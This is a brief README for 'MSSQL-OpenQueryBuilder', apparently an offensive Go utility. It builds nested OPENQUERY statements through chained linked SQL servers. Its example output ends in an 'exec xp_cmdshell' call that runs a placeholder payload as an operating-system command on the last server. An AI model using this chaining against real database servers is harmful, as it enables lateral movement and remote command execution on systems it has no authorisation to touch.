# MSSQL-OpenQueryBuilder

Build MSSQL open query

# Summary

Build MSSQL Open query from 1 to X targets.


# Examples 

## Multiple targets 

```
$ go run main.go -H target1.xyz -p mypayloadwith\"quotes\"  -H target2.xyz -H target3.xyz 
select * from openquery("target1.xyz",'select * from openquery("target2.xyz",''select * from openquery("target3.xyz",''''select @@servername; exec xp_cmdshell ''''''''mypayloadwith"quotes"'''''''''''')'')')
```



